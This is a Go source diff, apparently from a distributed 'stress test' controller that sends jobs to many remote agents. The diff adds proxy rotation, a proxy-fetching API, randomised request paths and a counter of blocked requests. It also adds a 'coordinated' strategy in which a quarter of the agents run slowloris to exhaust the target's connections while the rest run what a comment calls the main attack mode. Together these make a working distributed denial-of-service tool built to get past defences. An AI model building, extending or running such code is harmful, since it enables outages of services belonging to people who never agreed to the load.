@@ -66,6 +66,7 @@ type AgentProgress struct {
 	MbpsSent   float64 `json:"mbpsSent"`
 	MbpsRecv   float64 `json:"mbpsRecv"`
 	ActiveConn int64   `json:"activeConn"`
+	Blocked    int64   `json:"blocked"`
 	Running    bool    `json:"running"`
 }
 
@@ -81,6 +82,10 @@ type StressStartRequest struct {
 	TotalReqs   int               `json:"totalReqs"`
 	KeepAlive   bool              `json:"keepAlive"`
 	BodySize    int               `json:"bodySize"`
+	Proxies     []string          `json:"proxies"`
+	RandPaths   []string          `json:"randPaths"`
+	Strategy    string            `json:"strategy"` // unified | coordinated
+	ProxyAPI    string            `json:"proxyApi"`
 	ServerIDs   []string          `json:"serverIds" binding:"required"`
 }
 
@@ -149,6 +154,9 @@ func (h *StressHandler) Start(c *gin.Context) {
 		TotalReqs   int               `json:"totalReqs"`
 		KeepAlive   bool              `json:"keepAlive"`
 		BodySize    int               `json:"bodySize"`
+		Proxies     []string          `json:"proxies"`
+		RandPaths   []string          `json:"randPaths"`
+		ProxyAPI    string            `json:"proxyApi"`
 	}{
 		URL:         req.URL,
 		Method:      req.Method,
@@ -160,24 +168,59 @@ func (h *StressHandler) Start(c *gin.Context) {
 		TotalReqs:   req.TotalReqs,
 		KeepAlive:   req.KeepAlive,
 		BodySize:    req.BodySize,
+		Proxies:     req.Proxies,
+		RandPaths:   req.RandPaths,
+		ProxyAPI:    req.ProxyAPI,
 	})
 
 	task := &StressTask{
-		ID:         taskID,
-		URL:        req.URL,
-		Method:     req.Method,
-		ServerIDs:  make([]string, 0, len(onlineServers)),
-		Config:     config,
-		StartTime:  time.Now(),
-		Running:    true,
-		Progress:   make(map[string]*AgentProgress),
+		ID:        taskID,
+		URL:       req.URL,
+		Method:    req.Method,
+		ServerIDs: make([]string, 0, len(onlineServers)),
+		Config:    config,
+		StartTime: time.Now(),
+		Running:   true,
+		Progress:  make(map[string]*AgentProgress),
 	}
 
 	h.tasksMu.Lock()
 	h.tasks[taskID] = task
 	h.tasksMu.Unlock()
 
-	for _, s := range onlineServers {
+	// 协同策略：部分 agent 跑 slowloris 耗连接，其余跑主攻模式
+	var slowConfig json.RawMessage
+	slowCount := 0
+	if req.Strategy == "coordinated" && len(onlineServers) >= 2 {
+		slowCount = len(onlineServers) / 4
+		if slowCount < 1 {
+			slowCount = 1
+		}
+		slowConfig, _ = json.Marshal(struct {
+			URL         string            `json:"url"`
+			Method      string            `json:"method"`
+			Mode        string            `json:"mode"`
+			Headers     map[string]string `json:"headers"`
+			Concurrency int               `json:"concurrency"`
+			Duration    int               `json:"duration"`
+			KeepAlive   bool              `json:"keepAlive"`
+			Proxies     []string          `json:"proxies"`
+			ProxyAPI    string            `json:"proxyApi"`
+		}{
+			URL:         req.URL,
+			Method:      req.Method,
+			Mode:        "slowloris",
+			Headers:     req.Headers,
+			Concurrency: req.Concurrency,
+			Duration:    req.Duration,
+			KeepAlive:   true,
+			Proxies:     req.Proxies,
+			ProxyAPI:    req.ProxyAPI,
+		})
+		log.Printf("[Stress] 协同策略: %d/%d 节点跑 slowloris, 其余跑 %s", slowCount, len(onlineServers), req.Mode)
+	}
+
+	for i, s := range onlineServers {
 		serverID := s.ID
 		ss := &ws.StressSession{
 			OnProgress: func(data json.RawMessage) {
@@ -187,7 +230,11 @@ func (h *StressHandler) Start(c *gin.Context) {
 				h.handleDone(taskID, serverID, data)
 			},
 		}
-		if err := h.agentHub.StartStressTest(serverID, taskID, config, ss); err != nil {
+		agentConfig := config
+		if i < slowCount {
+			agentConfig = slowConfig
+		}
+		if err := h.agentHub.StartStressTest(serverID, taskID, agentConfig, ss); err != nil {
 			log.Printf("向 Agent %s 下发压测失败: %v", serverID, err)
 			continue
 		}
@@ -309,13 +356,14 @@ func (h *StressHandler) handleDone(taskID, serverID string, data json.RawMessage
 func (h *StressHandler) broadcastProgress(taskID string, task *StressTask) {
 	task.progressMu.RLock()
 	progresses := make([]*AgentProgress, 0, len(task.Progress))
-	var totalSent, totalSuccess, totalErrors, totalBytesSent, totalBytesRecv, totalActiveConn int64
+	var totalSent, totalSuccess, totalErrors, totalBlocked, totalBytesSent, totalBytesRecv, totalActiveConn int64
 	var totalRPS, totalMbpsSent, totalMbpsRecv float64
 	for _, p := range task.Progress {
 		progresses = append(progresses, p)
 		totalSent += p.Sent
 		totalSuccess += p.Success
 		totalErrors += p.Errors
+		totalBlocked += p.Blocked
 		totalRPS += p.RPS
 		totalBytesSent += p.BytesSent
 		totalBytesRecv += p.BytesRecv
@@ -332,6 +380,7 @@ func (h *StressHandler) broadcastProgress(taskID string, task *StressTask) {
 		"totalSent":       totalSent,
 		"totalSuccess":    totalSuccess,
 		"totalErrors":     totalErrors,
+		"totalBlocked":    totalBlocked,
 		"totalRPS":        totalRPS,
 		"totalBytesSent":  totalBytesSent,
 		"totalBytesRecv":  totalBytesRecv,
